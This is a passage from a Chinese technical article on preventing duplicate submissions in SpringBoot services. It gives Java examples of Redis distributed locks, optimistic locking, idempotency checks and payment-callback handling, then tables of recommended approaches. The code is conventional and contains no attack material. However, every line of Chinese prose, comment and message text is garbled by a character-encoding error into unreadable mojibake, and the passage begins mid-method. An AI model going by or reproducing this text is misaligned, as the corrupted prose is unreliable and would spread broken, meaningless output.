        <span class="hljs-keyword">if</span> (!distributedLockUtil.tryLock(lockKey, lockValue, <span class="hljs-number">10</span>)) {
            <span class="hljs-keyword">return</span> SeckillResult.fail(<span class="hljs-string">"æ­£åœ¨å¤„ç†ä¸­ï¼Œè¯·å‹¿é‡å¤æäº¤"</span>);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. æ£€æŸ¥å•†å“åº“å­˜ï¼ˆä½¿ç”¨ä¹è§‚é”ï¼‰</span>
            <span class="hljs-type">ProductPO</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productMapper.selectById(productId);
            <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span> || product.getStock() &lt;= <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> SeckillResult.fail(<span class="hljs-string">"å•†å“å·²å”®ç½„"</span>);
            }
            
            <span class="hljs-comment">// 4. æ‰£å‡åº“å­˜ï¼ˆä¹è§‚é”ï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">updateCount</span> <span class="hljs-operator">=</span> productMapper.updateStockWithVersion(
                productId, <span class="hljs-number">1</span>, product.getVersion());
            <span class="hljs-keyword">if</span> (updateCount == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> SeckillResult.fail(<span class="hljs-string">"åº“å­˜ä¸è¶³ï¼Œè¯·é‡è¯•"</span>);
            }
            
            <span class="hljs-comment">// 5. åˆ›å»ºè®¢å•ï¼ˆå¹‚ç­‰æ€§ä¿è¯ï¼‰</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">orderNo</span> <span class="hljs-operator">=</span> generateOrderNo(userId, productId);
            <span class="hljs-type">Long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> orderService.createOrderIdempotent(
                buildOrderParam(userId, productId), 
                orderNo
            );
            
            <span class="hljs-keyword">return</span> SeckillResult.success(orderId);
            
        } <span class="hljs-keyword">finally</span> {
            distributedLockUtil.releaseLock(lockKey, lockValue);
        }
    }
}
</code></pre>
<h4 data-id="heading-35">5.2 Bç«¯åœºæ™¯ï¼šæ‰¹é‡å¯¼å…¥</h4>
<p><strong>å®Œæ•´æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ‰¹é‡å¯¼å…¥æœåŠ¡
 * ã€åœºæ™¯è¯†åˆ«ã€‘ï¼šBç«¯æ‰¹é‡æ•°æ®å¯¼å…¥
 * ã€é˜²å¹¶å‘ç­–ç•¥ã€‘ï¼šåˆ†å¸ƒå¼é” + å”¯ä¸€ç´¢å¼• + å¹‚ç­‰æ€§
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchImportService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DistributedLockUtil distributedLockUtil;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ImportRecordMapper importRecordMapper;
    
    <span class="hljs-comment">/**
     * æ‰¹é‡å¯¼å…¥æ•°æ®
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> ImportResult <span class="hljs-title function_">batchImport</span><span class="hljs-params">(Long userId, List&lt;ImportData&gt; dataList, String importBatchNo)</span> {
        <span class="hljs-comment">// 1. åˆ†å¸ƒå¼é”ï¼šé˜²æ­¢é‡å¤å¯¼å…¥</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"import:lock:"</span> + importBatchNo;
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-keyword">if</span> (!distributedLockUtil.tryLock(lockKey, lockValue, <span class="hljs-number">300</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"å¯¼å…¥ä»»åŠ¡æ­£åœ¨å¤„ç†ä¸­ï¼Œè¯·å‹¿é‡å¤æäº¤"</span>);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. æ£€æŸ¥å¯¼å…¥è®°å½•æ˜¯å¦å·²å­˜åœ¨ï¼ˆå¹‚ç­‰æ€§ï¼‰</span>
            <span class="hljs-type">ImportRecordPO</span> <span class="hljs-variable">existingRecord</span> <span class="hljs-operator">=</span> importRecordMapper.selectByBatchNo(importBatchNo);
            <span class="hljs-keyword">if</span> (existingRecord != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> ImportResult.existing(existingRecord.getId());
            }
            
            <span class="hljs-comment">// 3. åˆ›å»ºå¯¼å…¥è®°å½•</span>
            <span class="hljs-type">ImportRecordPO</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportRecordPO</span>();
            record.setBatchNo(importBatchNo);
            record.setUserId(userId);
            record.setStatus(ImportStatusEnum.PROCESSING.getCode());
            importRecordMapper.insert(record);
            
            <span class="hljs-comment">// 4. æ‰¹é‡å¯¼å…¥æ•°æ®ï¼ˆä½¿ç”¨å”¯ä¸€ç´¢å¼•é˜²æ­¢é‡å¤ï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">successCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">failCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            
            <span class="hljs-keyword">for</span> (ImportData data : dataList) {
                <span class="hljs-keyword">try</span> {
                    importData(data, importBatchNo);
                    successCount++;
                } <span class="hljs-keyword">catch</span> (DuplicateKeyException e) {
                    <span class="hljs-comment">// å”¯ä¸€ç´¢å¼•å†²çªï¼Œæ•°æ®å·²å­˜åœ¨ï¼Œè·³è¿‡</span>
                    log.warn(<span class="hljs-string">"æ•°æ®å·²å­˜åœ¨ï¼Œè·³è¿‡ï¼š{}"</span>, data);
                    successCount++;
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    log.error(<span class="hljs-string">"æ•°æ®å¯¼å…¥å¤±è´¥"</span>, e);
                    failCount++;
                }
            }
            
            <span class="hljs-comment">// 5. æ›´æ–°å¯¼å…¥è®°å½•</span>
            record.setStatus(ImportStatusEnum.COMPLETED.getCode());
            record.setSuccessCount(successCount);
            record.setFailCount(failCount);
            importRecordMapper.updateById(record);
            
            <span class="hljs-keyword">return</span> ImportResult.success(record.getId(), successCount, failCount);
            
        } <span class="hljs-keyword">finally</span> {
            distributedLockUtil.releaseLock(lockKey, lockValue);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">importData</span><span class="hljs-params">(ImportData data, String importBatchNo)</span> {
        <span class="hljs-comment">// å¯¼å…¥é€»è¾‘ï¼ˆæ•°æ®åº“å”¯ä¸€ç´¢å¼•ä¿è¯ä¸é‡å¤ï¼‰</span>
        <span class="hljs-type">DataPO</span> <span class="hljs-variable">dataPO</span> <span class="hljs-operator">=</span> convertToPO(data);
        dataPO.setImportBatchNo(importBatchNo);
        dataMapper.insert(dataPO);
    }
}
</code></pre>
<h4 data-id="heading-36">5.3 æ”¯ä»˜åœºæ™¯ï¼šé˜²æ­¢é‡å¤æ”¯ä»˜</h4>
<p><strong>å®Œæ•´æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ”¯ä»˜æœåŠ¡
 * ã€åœºæ™¯è¯†åˆ«ã€‘ï¼šæ”¯ä»˜é˜²é‡å¤
 * ã€é˜²å¹¶å‘ç­–ç•¥ã€‘ï¼šå¹‚ç­‰æ€§ + åˆ†å¸ƒå¼é” + çŠ¶æ€æœº
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DistributedLockUtil distributedLockUtil;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> PaymentMapper paymentMapper;
    
    <span class="hljs-comment">/**
     * åˆ›å»ºæ”¯ä»˜è®¢å•ï¼ˆé˜²é‡å¤ï¼‰
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> PaymentDTO <span class="hljs-title function_">createPayment</span><span class="hljs-params">(CreatePaymentParam param)</span> {
        <span class="hljs-comment">// 1. å¹‚ç­‰æ€§æ£€æŸ¥ï¼šä½¿ç”¨è®¢å•IDä½œä¸ºå¹‚ç­‰æ€§key</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">idempotentKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"payment:"</span> + param.getOrderId();
        <span class="hljs-type">PaymentPO</span> <span class="hljs-variable">existingPayment</span> <span class="hljs-operator">=</span> paymentMapper.selectByOrderId(param.getOrderId());
        <span class="hljs-keyword">if</span> (existingPayment != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// æ”¯ä»˜è®¢å•å·²å­˜åœ¨ï¼Œè¿”å›å·²æœ‰è®¢å•</span>
            <span class="hljs-keyword">return</span> convertToDTO(existingPayment);
        }
        
        <span class="hljs-comment">// 2. åˆ†å¸ƒå¼é”ï¼šé˜²æ­¢å¹¶å‘åˆ›å»º</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"payment:lock:"</span> + param.getOrderId();
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-keyword">if</span> (!distributedLockUtil.tryLock(lockKey, lockValue, <span class="hljs-number">30</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"æ”¯ä»˜è®¢å•åˆ›å»ºä¸­ï¼Œè¯·å‹¿é‡å¤æäº¤"</span>);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. åŒé‡æ£€æŸ¥</span>
            existingPayment = paymentMapper.selectByOrderId(param.getOrderId());
            <span class="hljs-keyword">if</span> (existingPayment != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> convertToDTO(existingPayment);
            }
            
            <span class="hljs-comment">// 4. åˆ›å»ºæ”¯ä»˜è®¢å•</span>
            <span class="hljs-type">PaymentPO</span> <span class="hljs-variable">payment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaymentPO</span>();
            payment.setOrderId(param.getOrderId());
            payment.setAmount(param.getAmount());
            payment.setStatus(PaymentStatusEnum.PENDING.getCode());
            payment.setPaymentNo(generatePaymentNo());
            paymentMapper.insert(payment);
            
            <span class="hljs-keyword">return</span> convertToDTO(payment);
            
        } <span class="hljs-keyword">finally</span> {
            distributedLockUtil.releaseLock(lockKey, lockValue);
        }
    }
    
    <span class="hljs-comment">/**
     * æ”¯ä»˜å›è°ƒå¤„ç†ï¼ˆé˜²é‡å¤ï¼‰
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlePaymentCallback</span><span class="hljs-params">(String paymentNo, String thirdPartyPaymentNo)</span> {
        <span class="hljs-comment">// 1. æŸ¥è¯¢æ”¯ä»˜è®¢å•</span>
        <span class="hljs-type">PaymentPO</span> <span class="hljs-variable">payment</span> <span class="hljs-operator">=</span> paymentMapper.selectByPaymentNo(paymentNo);
        <span class="hljs-keyword">if</span> (payment == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.DATA_NOT_FOUND.code(), <span class="hljs-string">"æ”¯ä»˜è®¢å•ä¸å­˜åœ¨"</span>);
        }
        
        <span class="hljs-comment">// 2. çŠ¶æ€æ£€æŸ¥ï¼šåªæœ‰å¾…æ”¯ä»˜çŠ¶æ€æ‰èƒ½å¤„ç†</span>
        <span class="hljs-keyword">if</span> (payment.getStatus() != PaymentStatusEnum.PENDING.getCode()) {
            log.warn(<span class="hljs-string">"æ”¯ä»˜è®¢å•çŠ¶æ€å¼‚å¸¸ï¼Œè·³è¿‡å¤„ç†ï¼špaymentNo={}, status={}"</span>, 
                paymentNo, payment.getStatus());
            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// å·²å¤„ç†ï¼Œç›´æ¥è¿”å›ï¼ˆå¹‚ç­‰æ€§ï¼‰</span>
        }
        
        <span class="hljs-comment">// 3. åˆ†å¸ƒå¼é”ï¼šé˜²æ­¢å¹¶å‘å¤„ç†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"payment:callback:lock:"</span> + paymentNo;
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-keyword">if</span> (!distributedLockUtil.tryLock(lockKey, lockValue, <span class="hljs-number">30</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"æ”¯ä»˜å›è°ƒå¤„ç†ä¸­ï¼Œè¯·å‹¿é‡å¤æäº¤"</span>);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 4. åŒé‡æ£€æŸ¥çŠ¶æ€</span>
            payment = paymentMapper.selectByIdForUpdate(payment.getId());
            <span class="hljs-keyword">if</span> (payment.getStatus() != PaymentStatusEnum.PENDING.getCode()) {
                <span class="hljs-keyword">return</span>; <span class="hljs-comment">// å·²å¤„ç†</span>
            }
            
            <span class="hljs-comment">// 5. æ›´æ–°æ”¯ä»˜çŠ¶æ€ï¼ˆä¹è§‚é”ï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">updateCount</span> <span class="hljs-operator">=</span> paymentMapper.updateStatusWithVersion(
                payment.getId(),
                PaymentStatusEnum.SUCCESS.getCode(),
                payment.getVersion()
            );
            
            <span class="hljs-keyword">if</span> (updateCount &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 6. æ›´æ–°è®¢å•çŠ¶æ€</span>
                orderService.updateOrderStatus(payment.getOrderId(), OrderStatusEnum.PAID.getCode());
                log.info(<span class="hljs-string">"æ”¯ä»˜å›è°ƒå¤„ç†æˆåŠŸï¼špaymentNo={}"</span>, paymentNo);
            }
            
        } <span class="hljs-keyword">finally</span> {
            distributedLockUtil.releaseLock(lockKey, lockValue);
        }
    }
}
</code></pre>
<h3 data-id="heading-37">å…­ã€æœ€ä½³å®è·µæ€»ç»“</h3>
<h4 data-id="heading-38">6.1 æ–¹æ¡ˆé€‰æ‹©æŒ‡å—</h4>


















































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th><th>ç†ç”±</th></tr></thead><tbody><tr><td><strong>å‰ç«¯é˜²é‡å¤æäº¤</strong></td><td>æŒ‰é’®ç¦ç”¨ + è¯·æ±‚å»é‡</td><td>ç”¨æˆ·ä½“éªŒå¥½ï¼Œå®ç°ç®€å•</td></tr><tr><td><strong>å•æœºåº”ç”¨</strong></td><td>æœ¬åœ°é”ï¼ˆsynchronized/ReentrantLockï¼‰</td><td>æ€§èƒ½å¥½ï¼Œæ— ç½‘ç»œå¼€é”€</td></tr><tr><td><strong>åˆ†å¸ƒå¼åº”ç”¨</strong></td><td>åˆ†å¸ƒå¼é”ï¼ˆRedisï¼‰</td><td>æ”¯æŒé›†ç¾¤éƒ¨ç½²</td></tr><tr><td><strong>é«˜å¹¶å‘è¯»å¤šå†™å°‘</strong></td><td>ä¹è§‚é” + ç‰ˆæœ¬å·</td><td>æ€§èƒ½å¥½ï¼Œæ— é”ç«äº‰</td></tr><tr><td><strong>é«˜å¹¶å‘å†™å¤š</strong></td><td>æ‚²è§‚é” + åˆ†å¸ƒå¼é”</td><td>ä¿è¯å¼ºä¸€è‡´æ€§</td></tr><tr><td><strong>å¹‚ç­‰æ€§è¦æ±‚</strong></td><td>å”¯ä¸€ç´¢å¼• + Rediså¹‚ç­‰æ€§key</td><td>åŒé‡ä¿éšœ</td></tr><tr><td><strong>é™æµéœ€æ±‚</strong></td><td>Redisä»¤ç‰Œæ¡¶/æ»‘åŠ¨çª—å£</td><td>é˜²æ­¢ç³»ç»Ÿè¿‡è½½</td></tr><tr><td><strong>å‰Šå³°éœ€æ±‚</strong></td><td>é˜Ÿåˆ— + å¼‚æ­¥å¤„ç†</td><td>å¹³æ»‘å¤„ç†è¯·æ±‚</td></tr></tbody></table>
<h4 data-id="heading-39">6.2 ç»„åˆä½¿ç”¨ç­–ç•¥</h4>
<p><strong>é«˜å¹¶å‘ç§’æ€åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs">å‰ç«¯ï¼šæŒ‰é’®ç¦ç”¨ + è¯·æ±‚å»é‡
  â†“
åç«¯ï¼šé™æµ â†’ åˆ†å¸ƒå¼é” â†’ ä¹è§‚é” â†’ å¹‚ç­‰æ€§
</code></pre>
<p><strong>æ‰¹é‡å¯¼å…¥åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs">å‰ç«¯ï¼šæ–‡ä»¶ä¸Šä¼ è¿›åº¦ + é˜²é‡å¤ä¸Šä¼ 
  â†“
åç«¯ï¼šåˆ†å¸ƒå¼é” â†’ å”¯ä¸€ç´¢å¼• â†’ å¹‚ç­‰æ€§
</code></pre>
<p><strong>æ”¯ä»˜åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs">å‰ç«¯ï¼šæ”¯ä»˜æŒ‰é’®ç¦ç”¨ + è¯·æ±‚ID
  â†“
åç«¯ï¼šå¹‚ç­‰æ€§ â†’ åˆ†å¸ƒå¼é” â†’ çŠ¶æ€æœº â†’ ä¹è§‚é”
</code></pre>
<h4 data-id="heading-40">6.3 æ³¨æ„äº‹é¡¹</h4>
<h5 data-id="heading-41">6.3.1 åˆ†å¸ƒå¼é”æ³¨æ„äº‹é¡¹</h5>
<ol>
<li><strong>é”çš„è¿‡æœŸæ—¶é—´</strong>ï¼šå¿…é¡»å¤§äºä¸šåŠ¡æ‰§è¡Œæ—¶é—´ï¼Œé¿å…é”æå‰é‡Šæ”¾</li>
<li><strong>é”çš„é‡Šæ”¾</strong>ï¼šå¿…é¡»ä½¿ç”¨Luaè„šæœ¬ä¿è¯åŸå­æ€§ï¼Œé˜²æ­¢è¯¯åˆ å…¶ä»–å®ä¾‹çš„é”</li>
<li><strong>é”çš„é‡å…¥</strong>ï¼šå¦‚éœ€æ”¯æŒé‡å…¥ï¼Œä½¿ç”¨Redissonç­‰æ¡†æ¶</li>
<li><strong>æ­»é”é¢„é˜²</strong>ï¼šè®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´ï¼Œé¿å…æ­»é”</li>
</ol>
<h5 data-id="heading-42">6.3.2 å¹‚ç­‰æ€§æ³¨æ„äº‹é¡¹</h5>
<ol>
<li><strong>å¹‚ç­‰æ€§keyçš„é€‰æ‹©</strong>ï¼šä½¿ç”¨ä¸šåŠ¡å”¯ä¸€æ ‡è¯†ï¼ˆè®¢å•å·ã€ç”¨æˆ·ID+å•†å“IDç­‰ï¼‰</li>
<li><strong>è¿‡æœŸæ—¶é—´è®¾ç½®</strong>ï¼šæ ¹æ®ä¸šåŠ¡ç‰¹ç‚¹è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´</li>
<li><strong>åŒé‡æ£€æŸ¥</strong>ï¼šRedisæ£€æŸ¥ + æ•°æ®åº“æ£€æŸ¥ï¼Œä¿è¯å¯é æ€§</li>
<li><strong>å¼‚å¸¸å¤„ç†</strong>ï¼šå¹‚ç­‰æ€§å¤±è´¥æ—¶çš„é™çº§ç­–ç•¥</li>
</ol>
<h5 data-id="heading-43">6.3.3 æ•°æ®åº“é”æ³¨æ„äº‹é¡¹</h5>
<ol>
<li><strong>æ‚²è§‚é”</strong>ï¼šå¿…é¡»åœ¨äº‹åŠ¡ä¸­ä½¿ç”¨ï¼Œé¿å…é•¿æ—¶é—´æŒæœ‰é”</li>
<li><strong>ä¹è§‚é”</strong>ï¼šå¤±è´¥æ—¶éœ€è¦é‡è¯•æœºåˆ¶</li>
<li><strong>å”¯ä¸€ç´¢å¼•</strong>ï¼šåˆç†è®¾è®¡ç´¢å¼•ï¼Œé¿å…æ€§èƒ½é—®é¢˜</li>
<li><strong>æ­»é”é¢„é˜²</strong>ï¼šæŒ‰ç›¸åŒé¡ºåºè·å–é”ï¼Œé¿å…æ­»é”</li>
</ol>
<h4 data-id="heading-44">6.4 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<ol>
<li><strong>é”çš„ç²’åº¦</strong>ï¼šå°½é‡ç¼©å°é”çš„èŒƒå›´ï¼Œæé«˜å¹¶å‘æ€§èƒ½</li>
<li><strong>é”çš„è¶…æ—¶</strong>ï¼šè®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´ï¼Œé¿å…é•¿æ—¶é—´ç­‰å¾…</li>
<li><strong>å¼‚æ­¥å¤„ç†</strong>ï¼šéå…³é”®è·¯å¾„ä½¿ç”¨å¼‚æ­¥å¤„ç†ï¼Œæé«˜å“åº”é€Ÿåº¦</li>
<li><strong>ç¼“å­˜ä¼˜åŒ–</strong>ï¼šåˆç†ä½¿ç”¨ç¼“å­˜ï¼Œå‡å°‘æ•°æ®åº“å‹åŠ›</li>
</ol>
<h3 data-id="heading-45">ä¸ƒã€æ€»ç»“</h3>
<h4 data-id="heading-46">7.1 æ ¸å¿ƒè¦ç‚¹</h4>
<ol>
<li><strong>å‰ç«¯é˜²å¹¶å‘</strong>ï¼šUIå±‚æ§åˆ¶ + è¯·æ±‚æ‹¦æˆªï¼Œæå‡ç”¨æˆ·ä½“éªŒ</li>
<li><strong>åç«¯é˜²å¹¶å‘</strong>ï¼šåˆ†å¸ƒå¼é” + æ•°æ®åº“é” + å¹‚ç­‰æ€§ï¼Œä¿è¯æ•°æ®ä¸€è‡´æ€§</li>
<li><strong>é™æµå‰Šå³°</strong>ï¼šé˜²æ­¢ç³»ç»Ÿè¿‡è½½ï¼Œä¿è¯ç³»ç»Ÿç¨³å®šæ€§</li>
<li><strong>ç»„åˆä½¿ç”¨</strong>ï¼šæ ¹æ®åœºæ™¯ç»„åˆå¤šç§æ–¹æ¡ˆï¼Œè¾¾åˆ°æœ€ä½³æ•ˆæœ</li>
</ol>
<h4 data-id="heading-47">7.2 æ–¹æ¡ˆå¯¹æ¯”</h4>















































<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>å‰ç«¯é˜²é‡å¤</strong></td><td>å®ç°ç®€å•ã€ç”¨æˆ·ä½“éªŒå¥½</td><td>å¯è¢«ç»•è¿‡</td><td>æ‰€æœ‰åœºæ™¯ï¼ˆç¬¬ä¸€é“é˜²çº¿ï¼‰</td></tr><tr><td><strong>åˆ†å¸ƒå¼é”</strong></td><td>æ”¯æŒé›†ç¾¤ã€åŠŸèƒ½å¼ºå¤§</td><td>æœ‰ç½‘ç»œå¼€é”€ã€éœ€è€ƒè™‘æ­»é”</td><td>åˆ†å¸ƒå¼åº”ç”¨</td></tr><tr><td><strong>æ‚²è§‚é”</strong></td><td>å¼ºä¸€è‡´æ€§</td><td>æ€§èƒ½è¾ƒå·®ã€å¯èƒ½æ­»é”</td><td>å†™å¤šè¯»å°‘</td></tr><tr><td><strong>ä¹è§‚é”</strong></td><td>æ€§èƒ½å¥½ã€æ— é”ç«äº‰</td><td>éœ€è¦é‡è¯•æœºåˆ¶</td><td>è¯»å¤šå†™å°‘</td></tr><tr><td><strong>å¹‚ç­‰æ€§</strong></td><td>ä¿è¯ä¸é‡å¤æ‰§è¡Œ</td><td>éœ€è¦å­˜å‚¨ç©ºé—´</td><td>æ‰€æœ‰å†™æ“ä½œ</td></tr><tr><td><strong>é™æµ</strong></td><td>é˜²æ­¢ç³»ç»Ÿè¿‡è½½</td><td>å¯èƒ½æ‹’ç»æ­£å¸¸è¯·æ±‚</td><td>é«˜å¹¶å‘åœºæ™¯</td></tr></tbody></table>
<h4 data-id="heading-48">7.3 SpringBoot 2.x ç‰ˆæœ¬å…¼å®¹æ€§</h4>



































<table><thead><tr><th>æ–¹æ¡ˆ</th><th>å…¼å®¹æ€§</th><th>æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td><strong>åˆ†å¸ƒå¼é”ï¼ˆRedisï¼‰</strong></td><td>âœ… å®Œå…¨å…¼å®¹</td><td>ä½¿ç”¨Spring Data Redis</td></tr><tr><td><strong>æ•°æ®åº“é”</strong></td><td>âœ… å®Œå…¨å…¼å®¹</td><td>MyBatisæ”¯æŒSELECT FOR UPDATE</td></tr><tr><td><strong>ä¹è§‚é”</strong></td><td>âœ… å®Œå…¨å…¼å®¹</td><td>éœ€è¦æ‰‹åŠ¨å®ç°ç‰ˆæœ¬å·æ§åˆ¶</td></tr><tr><td><strong>é™æµ</strong></td><td>âœ… å®Œå…¨å…¼å®¹</td><td>ä½¿ç”¨Redis Luaè„šæœ¬</td></tr><tr><td><strong>é˜Ÿåˆ—å‰Šå³°</strong></td><td>âœ… å®Œå…¨å…¼å®¹</td><td>ä½¿ç”¨ThreadPoolTaskExecutor</td></tr></tbody></table>
<hr/>
<p><strong>æ–‡æ¡£ç‰ˆæœ¬ï¼š</strong> v1.0<br/>
<strong>é€‚ç”¨ç‰ˆæœ¬ï¼š</strong> SpringBoot 2.xã€Vue3 3.3+ã€JDK 1.8+</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>